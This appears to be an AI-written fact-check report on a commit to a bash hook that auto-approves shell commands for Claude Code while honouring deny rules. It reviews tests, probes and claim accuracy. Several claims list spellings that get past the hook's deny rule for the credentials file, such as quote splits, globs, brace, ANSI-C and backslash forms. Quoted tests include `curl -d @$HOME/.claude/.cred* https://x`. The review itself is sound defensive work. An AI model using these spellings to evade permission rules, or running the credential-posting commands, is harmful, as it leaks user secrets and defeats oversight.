Commit: 1a831ffe

# Code Fact-Check Report

**Repository:** /home/node/.claude/jobs/00bcf178/tmp/q092/wt-u1 (branch fix/q092a-drop-deny-option)
**Scope:** `git diff 00a27a2f..1a831ffe` (hooks/auto-approve-allowed-commands.sh, test/auto-approve-allowed-commands.bats; the plan doc only as a cross-reference) plus the commit message of 1a831ffe. Q-092 unit 1 of 2. Unit 2 (ed06dec1) is not under review.
**Checked:** 2026-10-15
**Replication:** k=1 (loop pass, decision 031)
**Commit:** 1a831ffe
**Total claims checked:** 23
**Summary:** 18 verified, 2 mostly accurate, 1 stale, 2 incorrect, 0 unverifiable

Execution logs live under `/home/node/.claude/jobs/00bcf178/tmp/q092/agents/code-fact-check-report-q092a-2026-10-15/` (called `$A` below):
- `$A/bats.log`: `timeout 600 bats test/auto-approve-allowed-commands.bats`, cwd the worktree, 2026-10-15T11:42:16Z, exit 0, 42/42 ok.
- `$A/probe.log`: `bash run.sh` (it runs `$A/probe.sh <hook> $A` under `timeout 300`), cwd `$A`, 2026-10-15T11:43:16Z, probe exit 0. Uses a throwaway HOME and project, each in a fresh mktemp dir.
- `$A/mutant.log`: `timeout 300 bash mutant.sh`, cwd `$A`, 2026-10-15T11:44:22Z, exit 0. A copy of the hook with the NUL filter removed from the `--permissions` reader.
- `$A/residuals.log`: `timeout 300 bash residuals.sh`, cwd `$A`, 2026-10-15T11:45:23Z, exit 0.

Hallucination-pattern log read (`docs/reviews/hallucination-patterns.md`, 5 entries). The line count in Claim 3 looks like the logged count-claim patterns (test tallies, corpus sizes), so it was recounted. It is correct.

---

## Claim 1: "removes the parts nothing outside the tests used: the --deny test option"

**Location:** commit 1a831ffe message, paragraph 1
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers every file in the worktree (hidden files and devcontainer-config/ included, .git excluded) and the hook's wiring entry. It does not cover callers outside this repo, such as a user's private scripts.

At 00a27a2f, `rg -n --hidden -- '--deny\b' .` turns up `--deny` only in the hook itself, the test file, and prose in docs/decisions/log.md row 53 ("bad `--deny`") (paraphrased, no quote available: the claim is about code that is absent, so there are no matching grep results to quote). The hook's one wiring entry passes no options:

```
// hooks/wiring.json:78
"command": "bash {{CLAUDE_DIR}}/hooks/auto-approve-allowed-commands.sh"
```

The only other references are test/link-claude-home-wiring.bats:194 and :205, which match that same option-less command string.

**Evidence:** `hooks/wiring.json:78`, `test/link-claude-home-wiring.bats:194-205`, `docs/decisions/log.md:76`

---

## Claim 2: "A new test pins that the hook's stdout is empty or exactly the allow JSON, never ask/deny/defer"

**Location:** commit 1a831ffe message, paragraph 2; test at `test/auto-approve-allowed-commands.bats:147-168`
**Type:** Behavioral / Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers what main() writes to stdout on every path: one literal `echo` of the allow JSON, nothing else. It does not cover the exit code. Malformed input aborts under `set -e` with a nonzero code (4, 5 or 1 in probes, never 2), and what Claude Code does with a nonzero, non-2 exit was not checked on a host.

The only stdout write reachable from main is:

```bash
# hooks/auto-approve-allowed-commands.sh:440-447
  if $all_allowed; then
    debug "Decision: ALLOW (all commands passed)"
    echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}'
  else
    debug "Decision: BLOCK (falling through to normal permission check)"
  fi

  exit 0
```

`debug` writes to stderr (`echo "[DEBUG] $*" >&2`, :128). The parse error goes to stderr too (`echo "Parse error: $ast" >&2`, :741). Every other function's output is captured by `$(...)` or by a process substitution read with `mapfile` (paraphrased, no quote available: this was established by reading all of main(), :341-448, and every helper it calls, so it spans many sites). `check_deps`'s `exit 2` (:548) is reachable only from `parse_commands`. The test also checks the source statically:

```bash
# test/auto-approve-allowed-commands.bats:151
  [ "$(grep -o '"permissionDecision":"[a-z]*"' "$HOOK" | sort -u)" = '"permissionDecision":"allow"' ]
```

The test passes (`$A/bats.log`). In probes, malformed hook input gave empty stdout with rc=4 (`not json`), rc=5 (`{"tool_input":"x"}`) and rc=1 (`--permissions` with no argument) (`$A/probe.log`, "exit codes / stdout").

**Evidence:** `hooks/auto-approve-allowed-commands.sh:126-130`, `hooks/auto-approve-allowed-commands.sh:341-448`, `hooks/auto-approve-allowed-commands.sh:535-550`, `test/auto-approve-allowed-commands.bats:147-168`, `$A/bats.log`, `$A/probe.log`

---

## Claim 3: "Split under the decision-62 cap (whole change 652 lines; this unit ~365)"

**Location:** commit 1a831ffe message, Notes
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the two counts as computed with the brief's numstat formula (docs/ excluded). It does not check what decision 62's cap is.

`git diff --numstat 00a27a2f..1a831ffe -- ':(top)' ':(top,exclude)docs/' | awk '{n+=$1+$2} END{print n}'` prints `365`. The same formula over 00a27a2f..ed06dec1 prints `652`, and `git merge-base --is-ancestor 1a831ffe ed06dec1` succeeds, so the units are stacked. Run in the worktree and in /workspace/.claude/wt-q092 at about 11:41Z and 11:46Z, exit 0. The output is the single number quoted here, so no separate capture file was kept.

**Evidence:** `git diff --numstat 00a27a2f..1a831ffe`, `git diff --numstat 00a27a2f..ed06dec1`

---

## Claim 4: "Tests leave --deny: the rule-table and --permissions NUL tests keep only their allow halves, and the fail-closed, CLAUDE_CONFIG_DIR and NUL tests take the allow-only form unit 2 needs."

**Location:** commit 1a831ffe message, paragraph 2
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the test edits in the diff. One test still passes `--deny` on purpose, to show the option is ignored. The two settings-file *deny* NUL tests (:368-381) keep their deny form; unit 2 removes them (ed06dec1), so "NUL tests" here means the new allow-side NUL test.

Every `--deny` in the bats file is gone except the deliberate one:

```bash
# test/auto-approve-allowed-commands.bats:250-253
@test "the hook ignores a --deny argument (the option was removed in Q-092)" {
  run bash -c "printf '%s' '{\"tool_input\":{\"command\":\"ls -la\"}}' \
    | bash '$HOOK' --permissions '[\"Bash(ls:*)\"]' --deny '[\"Bash\"]'"
  approved
```

`run_hook_rules` now takes two arguments (`bash "$3" --permissions "$2"`, :127). The rule-table tests (:305-329) and the CLAUDE_CONFIG_DIR tests (:285-335) use only allow rules (paraphrased, no quote available: this is the shape of several test bodies, summarized from the diff).

**Evidence:** `test/auto-approve-allowed-commands.bats:125-128`, `test/auto-approve-allowed-commands.bats:250-253`, `test/auto-approve-allowed-commands.bats:285-345`, `test/auto-approve-allowed-commands.bats:368-381`

---

## Claim 5: ROLE: "Whether Claude Code still applies permissions.deny after a hook "allow" is NOT verified ... Until a host check shows deny wins, the deny check in this hook is load-bearing in cc-isolated"

**Location:** `hooks/auto-approve-allowed-commands.sh:57-62` (unchanged in this unit)
**Type:** Staleness
**Verdict:** Stale
**Confidence:** High
**Verification mode:** static
**Scope:** Covers whether the ROLE text agrees with Q-082's answer and with this unit's own header edit. It does not re-run Q-082. Unit 2 (ed06dec1) rewrites ROLE, so this is not missing work, only an inconsistency in the unit-1 state.

ROLE says the question is open and the deny check is load-bearing:

```
# hooks/auto-approve-allowed-commands.sh:57-61
# Bash(*.credentials.json*). Whether Claude Code still applies permissions.deny
# after a hook "allow" is NOT verified: a hook "ask" is known to override it
# (Claude Code issue #39344), "allow" has not been tested on a host (open;
# fact-check Claim 20b). Until a host check shows deny wins, the deny check in
# this hook is load-bearing in cc-isolated: nothing else stands between an
```

Twelve lines later, the edited section says the question is settled:

```
# hooks/auto-approve-allowed-commands.sh:72-73
# The de-quoted match and the --deny test option are gone (Q-092, unit 1 of 2):
# Q-082 showed Claude Code applies its own deny rules after a hook "allow".
```

Q-082 is ANSWERED in docs/working/questions-archive.md: "So a PreToolUse hook `allow` does **not** override a matching `permissions.deny` rule. The deny won." Its Interim line, "the hook header calls its deny check load-bearing in cc-isolated", was the pre-answer state. ed06dec1 replaces the paragraph with "ROLE: AN ALLOW-ONLY CONVENIENCE LAYER (Q-092)".

**Evidence:** `hooks/auto-approve-allowed-commands.sh:50-65`, `hooks/auto-approve-allowed-commands.sh:72-73`, `docs/working/questions-archive.md` (### Q-082), `git show ed06dec1 -- hooks/auto-approve-allowed-commands.sh`

---

## Claim 6: "The hook never approves a command when a Bash deny rule matches the raw command or any extracted command."

**Location:** `hooks/auto-approve-allowed-commands.sh:67-68`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers deny rules read from the three settings files, and both match points: raw before extraction, and each extracted command. It does not cover deny rules in sources the hook does not read (managed settings, `--settings`), which the header itself excludes.

```bash
# hooks/auto-approve-allowed-commands.sh:389-392
  if matches_deny "$command"; then
    debug "Decision: BLOCK (deny rule; falling through to normal permission check)"
    exit 0
  fi
```

```bash
# hooks/auto-approve-allowed-commands.sh:426-438
  for full_command in "${extracted_commands[@]}"; do
    [[ -z "$full_command" ]] && continue

    if matches_deny "$full_command"; then
      all_allowed=false
      break
    fi
    ...
  done
(excerpt ends :438; enclosing main() continues to :448, read; the allow echo at :442 is gated on all_allowed)
```

Probes (`$A/probe.log`, first section) gave these results. `cat ~/.claude/.credentials.json` was not approved (raw match). `ls | rm -rf x` was not approved under `Bash(rm -rf:*)`: the anchored glob misses the raw string but matches the extracted `rm -rf x`. `echo ok && git push` was not approved. Bare `Bash`, `Bash(*)` and `Bash(**)` each blocked `ls -la`.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:243-260`, `hooks/auto-approve-allowed-commands.sh:296-311`, `hooks/auto-approve-allowed-commands.sh:378-448`, `$A/probe.log`

---

## Claim 7: "It FAILS CLOSED on its inputs: if any settings file below exists but cannot be read, does not hold exactly one JSON object, or has permissions, permissions.allow or permissions.deny of the wrong shape, no command is approved on that call."

**Location:** `hooks/auto-approve-allowed-commands.sh:68-71`
**Type:** Error-handling
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers unreadable files, directories, non-objects, `{}{}`, empty files, and non-array, non-string or object values for allow and deny. It does not hold for `false` in `permissions.allow` or `permissions.deny`, which is read as an empty list.

The shape check uses jq's alternative operator:

```
# hooks/auto-approve-allowed-commands.sh:169-173
    ((.allow // []) | if type == "array" then .[] | select(type == "string") | "A\t" + .
                      else error("permissions.allow is not an array") end),
    ((.deny // []) | if type == "array"
                     then .[] | if type == "string" then "D\t" + . else error("non-string deny rule") end
                     else error("permissions.deny is not an array") end)
```

`//` replaces `false` as well as `null`, so a wrong-shaped `false` never reaches the error. Probed with a global settings file (`$A/probe.log`, "shapes"). `{"permissions":{"deny":false}}` and `{"permissions":{"allow":false}}` both still let `ls -la` be **approved** from the project's allow rule. `deny:{}`, `deny:"Bash"`, `deny:[1]`, a directory and a mode-000 file were all not approved. A precise version would add "(`null` or `false` counts as absent)". The behaviour is not new in this unit, but this unit restates the sentence.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:159-177`, `hooks/auto-approve-allowed-commands.sh:181-207`, `hooks/auto-approve-allowed-commands.sh:267-274`, `$A/probe.log`

---

## Claim 8: "The de-quoted match and the --deny test option are gone (Q-092, unit 1 of 2): Q-082 showed Claude Code applies its own deny rules after a hook "allow"."

**Location:** `hooks/auto-approve-allowed-commands.sh:72-73`
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers removal of the code (no `dq`, no `PARAM_DEFAULT_RE`, no `--deny` case) and the record in Q-082. It does not re-run the host test.

`matches_deny` now compares only `"$str" == $glob` (:305). The arg loop has only `--debug`, `--permissions` and `*) shift` (:344-356), so `--deny` and its value are skipped. A probe with `--deny '["Bash"]'` still approved `git status` (`$A/probe.log`). The Q-082 archive entry records the hook-allow test: "`cat x.q082-canary` was **denied** ... the user confirmed `/hooks` listed the test hook."

**Evidence:** `hooks/auto-approve-allowed-commands.sh:296-311`, `hooks/auto-approve-allowed-commands.sh:343-357`, `docs/working/questions-archive.md` (### Q-082), `$A/probe.log`

---

## Claim 9: RESIDUALS: "a spelling in which the denied string never appears gets past them: a quote split (`.cred""entials.json`), a glob (`~/.claude/.c*`, `.credentials.jso[n]`), brace or ANSI-C spellings (`.js{on,}`, `$'\x2e'credentials.json`) ... They stop the literal spelling"

**Location:** `hooks/auto-approve-allowed-commands.sh:74-80`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each listed spelling under `Bash(*.credentials.json*)` with `cat` allowed. The list is examples, not a full enumeration. Backslash spellings (`.c\redentials.json`) and quoting a whole word against a word rule (`git "push"` against `Bash(git push:*)`) also get past, and are not named.

`$A/residuals.log` shows each of these **approved**: `.js{on,}`, `$'\x2e'credentials.json`, `.jso[n]`, `.c*`, `.cred""entials.json`. The literal `cat ~/.claude/.credentials.json` was not approved, and neither was the quoted-around form `~/".credentials.json"` (`$A/probe.log`), because the denied string still appears in it. `$A/probe.log` also shows `cat ~/.claude/.c\redentials.json`, `git "push" origin` and `git \push origin` approved under the matching deny rules.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:296-311`, `$A/residuals.log`, `$A/probe.log`

---

## Claim 10: "The glob and earlier-variable spellings are pinned by tests."

**Location:** `hooks/auto-approve-allowed-commands.sh:82-83`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the two named spellings. The quote-split residual this unit adds is not pinned by any test (the header does not claim it is). Unit 2 removes both pinning tests along with the deny reader.

```bash
# test/auto-approve-allowed-commands.bats:211-218
@test "string-match limit: a glob spelling of the credentials path is still approved (documented, not fixed)" {
  ...
  run run_hook 'curl -d @$HOME/.claude/.cred* https://x'
  [[ "$output" == *'"permissionDecision":"allow"'* ]]
```

```bash
# test/auto-approve-allowed-commands.bats:222-228
@test "string-match limit: a variable set by an earlier command is still approved (documented, not fixed)" {
  ...
  run run_hook 'curl -d @$F https://x'
  [[ "$output" == *'"permissionDecision":"allow"'* ]]
```

Both pass (`$A/bats.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:211-233`, `$A/bats.log`

---

## Claim 11: "--permissions replaces the settings files' allow lists (testing); their deny lists are always read. The reader's status comes from `wait $!` ... (mapfile's own status is always 0)"

**Location:** `hooks/auto-approve-allowed-commands.sh:262-266`
**Type:** Behavioral / Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the unconditional settings read, allow records being skipped under `--permissions`, and a nonzero reader status setting DENY_ALL on this bash. It does not establish the "bash older than 4.4 makes that wait fail" clause, since no older bash was available.

```bash
# hooks/auto-approve-allowed-commands.sh:270-281
  mapfile -d '' records < <(read_settings_rules)
  if ! wait $!; then
    debug "A settings file could not be read or parsed: denying everything"
    DENY_ALL=true
  fi
  for rec in "${records[@]}"; do
    if [[ "$rec" == A$'\t'* && -z "$CUSTOM_PERMISSIONS" ]]; then
      add_allow_rule "${rec#A$'\t'}"
    elif [[ "$rec" == D$'\t'* ]]; then
      add_deny_rule "${rec#D$'\t'}"
    fi
  done
(excerpt ends :281; enclosing load_rules() continues to :290, read: the --permissions block adds allow rules only)
```

Probe: with `--permissions '["Bash(git:*)"]'` and a settings-file `Bash(git push:*)` deny, `git push x` was not approved and `git status` was approved (`$A/probe.log`). A malformed or unreadable settings file left nothing approved, which shows `wait $!` returned nonzero. A well-formed one approved, which shows it returned 0.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:267-290`, `$A/probe.log`

---

## Claim 12: "True when a deny rule matches the string ... or when DENY_ALL is set. ... add_deny_rule has already escaped everything but `*`, so `*` is the only live wildcard."

**Location:** `hooks/auto-approve-allowed-commands.sh:292-295`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `?` and `[...]` matching literally, DENY_ALL short-circuiting, and the de-quote removal. It does not cover extglob characters, which are escaped by the same loop but were not probed.

```bash
# hooks/auto-approve-allowed-commands.sh:251-258
  for ((i = 0; i < ${#body}; i++)); do
    c=${body:i:1}
    if [[ "$c" == [A-Za-z0-9*] ]]; then
      glob+="$c"
    else
      glob+="\\$c"
    fi
  done
```

The tests for this (`glob metacharacters ... match literally`, `? in a deny rule is a literal character`) were deleted with `--deny`, so a probe replaced them (`$A/probe.log`). Under `Bash(cat notes[1].txt)`, `cat notes[1].txt` was not approved and `cat notes1.txt` was approved. Under `Bash(cat file?.txt)`, `cat file?.txt` was not approved and `cat file1.txt` was approved.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:243-260`, `hooks/auto-approve-allowed-commands.sh:296-311`, `$A/probe.log`

---

## Claim 13: "A hook "allow" does not override permissions.deny (host test Q-082), and the hook never emits "ask", the decision that does (Claude Code #39344). The hook still reads settings-file deny rules; --deny and the de-quoted match are gone."

**Location:** `test/auto-approve-allowed-commands.bats:114-117`
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the hook source and the Q-082 record. It does not open issue #39344 (the sandbox has no egress); the issue is cited as recorded in Q-082 and decision log row 53.

The only decision string in the source is `"permissionDecision":"allow"` (:442), and settings deny records still feed `add_deny_rule` (:278-279). See Claims 2, 8 and 11.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:278-279`, `hooks/auto-approve-allowed-commands.sh:442`, `docs/working/questions-archive.md` (### Q-082)

---

## Claim 14: "Stdout alone (stderr dropped), over every exit path of main."

**Location:** `test/auto-approve-allowed-commands.bats:149`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** static
**Scope:** Covers which of main()'s exits the test's inputs reach. The static grep at :151 covers the whole source's decision strings no matter which paths run.

The inputs reach: no command (`''`, `{}`), the `set -e` abort at :368 (`not json`), no allow prefixes (malformed global file), the raw-deny exit (`cat ~/.claude/.credentials.json`), the extraction failure (`ls $(pwd)`, `ls (`, `$REPRO`), the extracts-to-nothing exit (`# comment`), the not-allowed break (`python3 x`) and allow (`ls -la`). Two exits are never reached:

```bash
# hooks/auto-approve-allowed-commands.sh:360-363
  if ! command -v jq &>/dev/null; then
    debug "jq not found, falling through to normal permission check"
    exit 0
  fi
```

The other is the in-loop deny break at :429-432. Under the test's only deny rule, `Bash(*.credentials.json*)`, any command whose extracted part matches also matches raw, so the :389 exit always fires first (paraphrased, no quote available: this follows from the unanchored `*...*` glob together with extraction producing substrings of the raw text). Both missed paths print nothing (Claim 2), so the invariant holds. The comment overstates what the test covers.

**Evidence:** `test/auto-approve-allowed-commands.bats:147-168`, `hooks/auto-approve-allowed-commands.sh:360-448`

---

## Claim 15: "the hook ignores a --deny argument (the option was removed in Q-092)"

**Location:** `test/auto-approve-allowed-commands.bats:250`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `--deny JSON` placed after `--permissions`. It does not cover `--deny` placed before `--permissions`. That ordering also works: `*) shift` drops `--deny`, then the JSON value, so the loop stays aligned.

```bash
# hooks/auto-approve-allowed-commands.sh:353-355
      *)
        shift
        ;;
```

Test passes (`$A/bats.log`), and the probe agrees (`$A/probe.log`, "--deny ignored").

**Evidence:** `hooks/auto-approve-allowed-commands.sh:343-357`, `test/auto-approve-allowed-commands.bats:250-254`, `$A/bats.log`

---

## Claim 16: "a malformed global settings file means nothing is approved" / shape loop / "an unparseable project settings.json fails closed even when settings.local.json is well formed"

**Location:** `test/auto-approve-allowed-commands.bats:259-292`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the listed bad shapes, including the newly added `deny:{}`. It does not cover `false` values (Claim 7).

Each test asserts not_approved for the bad file and has an approved control where one is given. All pass (`$A/bats.log`). Changing `! approved` to `not_approved` in the loop at :280 makes the assertion able to fail, which matches the helper comment at :132-134.

**Evidence:** `test/auto-approve-allowed-commands.bats:130-134`, `test/auto-approve-allowed-commands.bats:259-292`, `$A/bats.log`

---

## Claim 17: "the global settings file is read from CLAUDE_CONFIG_DIR ... ~/.claude is not the global dir while CLAUDE_CONFIG_DIR points elsewhere ... An empty CLAUDE_CONFIG_DIR falls back to $HOME/.claude"

**Location:** `test/auto-approve-allowed-commands.bats:296-316`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers which global file supplies allow rules under a set and an empty CLAUDE_CONFIG_DIR. It no longer tests that deny rules come from the CLAUDE_CONFIG_DIR file; the allow-only form was chosen for unit 2.

The two global files hold different allow rules (`ls` in ~/.claude, `cat` in CLAUDE_CONFIG_DIR). The assertions flip when CLAUDE_CONFIG_DIR is emptied, so each one tells the sources apart. This matches `settings_files`:

```bash
# hooks/auto-approve-allowed-commands.sh:147-148
  printf '%s\0' "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" \
    "${root:-.}/.claude/settings.json" "${root:-.}/.claude/settings.local.json"
```

Passes (`$A/bats.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:144-149`, `test/auto-approve-allowed-commands.bats:296-316`, `$A/bats.log`

---

## Claim 18: "a relative CLAUDE_CONFIG_DIR fails closed instead of reading another directory's allow rules" / "a newline in the global settings path fails closed"

**Location:** `test/auto-approve-allowed-commands.bats:318-336`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers fail-closed behaviour for a relative value (run from $PROJECT) and for a newline-bearing value. It does not repeat the old run from a second cwd (`cd $PROJECT/sub` was dropped). That run is not needed, because the relative check returns 1 whatever the cwd.

```bash
# hooks/auto-approve-allowed-commands.sh:186-189
  if [[ -n "${CLAUDE_CONFIG_DIR:-}" && "$CLAUDE_CONFIG_DIR" != /* ]]; then
    debug "CLAUDE_CONFIG_DIR is relative: denying everything"
    return 1
  fi
```

Both the project's `cat` and the relative dir's `ls` stay unapproved, so the project's allow rules are refused too, not only the wrongly resolved file. Passes (`$A/bats.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:181-207`, `test/auto-approve-allowed-commands.bats:318-336`, `$A/bats.log`

---

## Claim 19: "a NUL inside a settings allow rule fails closed instead of splitting into two rules"

**Location:** `test/auto-approve-allowed-commands.bats:342-349`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the settings-file path. Its `ls -la` → not_approved assertion tells fail-closed apart from a silent drop, and its `curl` assertion tells it apart from a split.

```
# hooks/auto-approve-allowed-commands.sh:175
| if explode | any(. == 0) then error("NUL inside a rule string") else . end
```

Passes (`$A/bats.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:159-177`, `test/auto-approve-allowed-commands.bats:342-349`, `$A/bats.log`

---

## Claim 20a: "a NUL inside a --permissions rule drops that rule only" (code behaviour)

**Location:** `test/auto-approve-allowed-commands.bats:351`; code `hooks/auto-approve-allowed-commands.sh:286-288`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook. A NUL-bearing `--permissions` entry is dropped, not split, and sibling entries survive.

```bash
# hooks/auto-approve-allowed-commands.sh:286-287
    mapfile -d '' records < <(printf '%s' "$CUSTOM_PERMISSIONS" \
      | jq -j '.[]? | select(type == "string" and (explode | any(. == 0) | not)) | . + "\u0000"' 2>/dev/null)
```

With `["Bash(zz)\u0000Bash(curl:*)"]`, the real hook does not approve `curl x` (`$A/mutant.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:283-289`, `$A/mutant.log`

## Claim 20b: "a NUL inside a --permissions rule drops that rule only" (that the test pins it)

**Location:** `test/auto-approve-allowed-commands.bats:351-356`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers whether the test's inputs tell "dropped" apart from "split into two rules". The test does pin the "only" half (a sibling rule survives).

```bash
# test/auto-approve-allowed-commands.bats:351-356
@test "a NUL inside a --permissions rule drops that rule only" {
  run_hook_rules 'curl x' '["Bash(ls\u0000:*)","Bash(zz)"]'
  not_approved
  run_hook_rules 'ls -la' '["Bash(ls\u0000:*)","Bash(ls:*)"]'
  approved
}
```

Split at its NUL, `Bash(ls\u0000:*)` becomes `Bash(ls` (not a Bash rule) and `:*)`. Neither half approves `curl x`, and neither affects `ls -la`, so both assertions come out the same with or without the drop. I removed the NUL `select` from a copy of the hook (`$A/mutant.log`, mutation applied to 1 line). The mutant gives the same two results as the real hook (none, ALLOW). Yet it **approves** `curl x` for `["Bash(zz)\u0000Bash(curl:*)"]`, where the real hook does not. The test passes on the mutant, so it does not pin the drop that its title names. The first assertion was carried over unchanged from the deleted combined test, which had the same blind spot.

**Evidence:** `test/auto-approve-allowed-commands.bats:351-356`, `hooks/auto-approve-allowed-commands.sh:286-287`, `$A/mutant.log`

---

## Claim 21: "rule table: Bash(ls) is a command prefix" / "Bash(rm:*) is a word prefix" / "a bare Bash rule is ignored"

**Location:** `test/auto-approve-allowed-commands.bats:373-387` and :396-399
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the three allow-side rows the tests exercise. The deny column of the header's RULE SYNTAX table (:94-109, unchanged here) lost its tests in this unit. Claims 6 and 12 re-probed the bare-`Bash`, `Bash(*)` and `?`/`[` rows; the `Bash(ls)`-is-exact deny row was not re-probed.

`is_command_allowed` matches `"$allowed"` exactly or `"$allowed "*` (:330), so `Bash(rm:*)` does not approve `rmdir x`. `add_allow_rule` returns early for a bare rule (`$RULE_BARE && return 0`, :234). All pass (`$A/bats.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:230-236`, `hooks/auto-approve-allowed-commands.sh:316-339`, `$A/bats.log`

---

## Claim 22: "rule table: Bash(ls *) approves nothing"

**Location:** `test/auto-approve-allowed-commands.bats:389-392` (title changed in this unit); same wording in the unchanged header row `hooks/auto-approve-allowed-commands.sh:103`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `Bash(ls *)` as an allow rule, against the commands `ls *` and `ls * -la`. It does not check what Claude Code itself does with the rule.

The allow rule is the literal prefix `ls *`, and a command whose extracted text starts with that literal is approved:

```bash
# hooks/auto-approve-allowed-commands.sh:330-331
    if [[ "$full_command" == "$allowed" ]] || [[ "$full_command" == "$allowed "* ]] \
       || { [[ "$allowed" == *[\ /]* ]] && [[ "$full_command" == "$allowed/"* ]]; }; then
```

`$A/mutant.log`, last section: `--permissions '["Bash(ls *)"]'` **approves** `ls *` and `ls * -la` (a bare `*` is a Lit, an approvable shape). The test checks only `ls -la`. Accurate wording would be "approves only commands that begin with the literal text `ls *`". This matters for rules like `Bash(rm *)`, which approves `rm *`. ed06dec1 keeps the same "approves nothing" wording (its header :90 and test :303).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:103`, `hooks/auto-approve-allowed-commands.sh:316-339`, `test/auto-approve-allowed-commands.bats:389-392`, `$A/mutant.log`

---

Note on numbering: claims run 1-22, with 20 split into 20a and 20b, so there are 23 atomic verdicts. Verified: 1-4, 6, 8-13, 15-19, 20a, 21. Mostly accurate: 7, 14. Stale: 5. Incorrect: 20b, 22. The commit-message claims (1-4) come first, then the hook, then the tests.

## Observations outside the diff (not counted)

- `hooks/auto-approve-allowed-commands.sh:15`: "--permissions JSON Use custom permissions instead of reading from settings files". With `--permissions`, the settings files are still read, for deny rules and for the fail-closed check (:270-274). This was already untrue before this unit, whenever `--deny` was not given. ed06dec1 changes the code so that it becomes true.
- `hooks/auto-approve-allowed-commands.sh:87`: "a relative value is used as written, from the hook's cwd". The code fails closed on a relative value (:186-189). ed06dec1 corrects it to "a relative value approves nothing".
- `test/auto-approve-allowed-commands.bats:235-241` ("caught by the raw-string check"): the command contains an assignment and `$(( ))`, so the shape filter would refuse it with no deny rule at all. The test does not isolate the raw-string check. Unit 2 deletes it.

## Claims Requiring Attention

### Incorrect
- **Claim 20b** (`test/auto-approve-allowed-commands.bats:351-356`): neither assertion tells a dropped NUL rule apart from a split one. The test passes with the NUL filter removed. A discriminating case is `["Bash(zz)\u0000Bash(curl:*)"]` with `curl x` → not approved.
- **Claim 22** (`test/auto-approve-allowed-commands.bats:389`; header `:103`): `Bash(ls *)` as an allow rule approves `ls *` and `ls * -la`, not nothing.

### Stale
- **Claim 5** (`hooks/auto-approve-allowed-commands.sh:57-62`): ROLE still calls the Q-082 question open and the deny check load-bearing. That contradicts :72-73 in the same header and Q-082's answer. ed06dec1 rewrites it.

### Mostly Accurate
- **Claim 7** (`hooks/auto-approve-allowed-commands.sh:68-71`): `permissions.allow: false` and `permissions.deny: false` are read as absent (jq `//`), not failed closed.
- **Claim 14** (`test/auto-approve-allowed-commands.bats:149`): "every exit path of main" leaves out the jq-missing exit (:360-363) and the in-loop deny break (:429-432).

### Unverifiable
- (none)

## Goal-Alignment Note

The goal is to land Q-092 as two stacked units, each reviewed clean. This unit's central claims hold under execution. `--deny` has no caller outside the tests. The de-quoted match is gone, and quote splits now pass the hook as its RESIDUALS section says. The settings-file deny reader still blocks raw and extracted matches. Main's stdout carries only the allow JSON, never ask, deny or defer, so the #39344 precondition Q-092 asked about holds.

Nothing found blocks the removal itself. The findings are about documentation and tests:
- ROLE (Claim 5) contradicts the header's own new sentence, until unit 2 replaces it.
- The `Bash(ls *)` title is wrong (Claim 22), and unit 2 inherits it.
- One NUL test does not pin what its title says (Claim 20b).
- Two statements are imprecise (Claims 7 and 14).

Two things go beyond the preamble's "known and accepted" list (quote-split spellings and compound commands with a denied subcommand). First, backslash spellings (`.c\redentials.json`) and whole-word quoting (`git "push"`) also pass the hook's deny check now. They belong to the same de-quote family, but the header names only the `""` split. Second, the `false`-valued permissions shape was not failed closed before this unit either.
